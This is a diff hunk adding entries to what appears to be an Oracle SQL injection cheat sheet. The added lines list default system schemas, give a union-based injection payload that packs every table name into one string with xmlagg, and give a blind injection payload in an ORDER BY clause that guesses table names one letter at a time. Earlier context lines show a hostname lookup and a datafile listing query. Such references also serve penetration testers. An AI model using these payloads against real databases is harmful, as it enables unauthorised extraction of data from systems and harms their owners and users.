@@ -2795,7 +2795,18 @@ SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; — gets hostnames
 
 SELECT name FROM V$DATAFILE;
 
+# Default/System Databases
 
+SYSTEM
+SYSAUX
+
+# Get all tablenames in one string
+
+select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,’) from all_tables —  when using union based SQLI with only one row
+
+# Blind SQLi in order by clause
+
+order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end — you must know 2 column names with the same datatype
 
 
 
